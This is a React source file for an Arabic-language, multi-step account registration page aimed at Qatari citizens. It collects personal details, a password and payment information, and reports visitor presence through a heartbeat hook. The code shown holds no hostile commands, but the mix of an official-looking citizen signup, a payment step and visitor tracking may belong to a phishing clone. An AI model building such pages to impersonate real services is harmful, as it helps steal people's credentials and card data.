import React, { useState } from "react";
import { Header } from "@/components/Header";
import { Footer } from "@/components/Footer";
import { Stepper } from "@/components/Stepper";
import { Step1AccountType } from "@/components/steps/Step1AccountType";
import { StepLogin } from "@/components/steps/StepLogin";
import { Step2PersonalData } from "@/components/steps/Step2PersonalData";
import { Step3Password } from "@/components/steps/Step3Password";
import { Step4Payment } from "@/components/steps/Step4Payment";
import { MessageCircle } from "lucide-react";
import { useHeartbeat } from "@/hooks/useHeartbeat";

export default function Register() {
  const [step, setStep] = useState(1);
  const [isNewAccount, setIsNewAccount] = useState(true);
  const [accountType, setAccountType] = useState<string>("citizen");
  const [formData, setFormData] = useState({
    email: "",
    fullNameArabic: "",
    fullNameEnglish: "",
    phoneNumber: "",
    dateOfBirth: "",
    gender: "male",
    nationality: "qatar",
    accountType: "citizen",
    address: {
      buildingNumber: "",
      area: "",
      street: "",
    }
  });

  useHeartbeat("/register");

  // Steps differ based on new vs existing account
  const newAccountSteps = [
    "نوع الحساب",
    "البيانات الشخصية",
    "كلمة المرور",
    "الدفع",
  ];

  const existingAccountSteps = [
    "نوع الحساب",
    "تسجيل الدخول",
  ];

  const steps = isNewAccount ? newAccountSteps : existingAccountSteps;

  const nextStep = () => setStep((prev) => Math.min(prev + 1, steps.length));
  const prevStep = () => setStep((prev) => Math.max(prev - 1, 1));

  const handleAccountTypeNext = (isNew: boolean, type: string) => {
    setIsNewAccount(isNew);
    setAccountType(type);
    setFormData(prev => ({ ...prev, accountType: type }));
    nextStep();
  };

  const handlePersonalDataNext = (data: any) => {
    setFormData({ ...data, accountType });
    nextStep();
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
      <Header />

      <Stepper currentStep={step} steps={steps} />

      <main className="flex-1 container mx-auto px-4 pb-12 max-w-3xl">
        <div className="bg-gray-100/50 rounded-lg shadow-sm border border-gray-200 overflow-hidden min-h-[600px]">
          {step === 1 && <Step1AccountType onNext={handleAccountTypeNext} />}
          
          {/* Existing User Flow - Login */}
          {!isNewAccount && step === 2 && (
            <StepLogin onBack={prevStep} />
          )}
          
          {/* New User Flow */}
          {isNewAccount && step === 2 && (
            <Step2PersonalData 
              onNext={handlePersonalDataNext} 
              onBack={prevStep}
              initialData={formData}
            />
          )}
          {isNewAccount && step === 3 && <Step3Password onNext={nextStep} onBack={prevStep} />}
          {isNewAccount && step === 4 && <Step4Payment onNext={nextStep} onBack={prevStep} formData={formData} />}
        </div>
      </main>

      <div className="fixed bottom-6 right-6 z-50">
        <button className="bg-white p-3 rounded-full shadow-lg border border-gray-200 hover:bg-gray-50 text-primary">
          <MessageCircle className="h-8 w-8 fill-primary text-white" />
        </button>
      </div>

      <Footer />
    </div>
  );
}
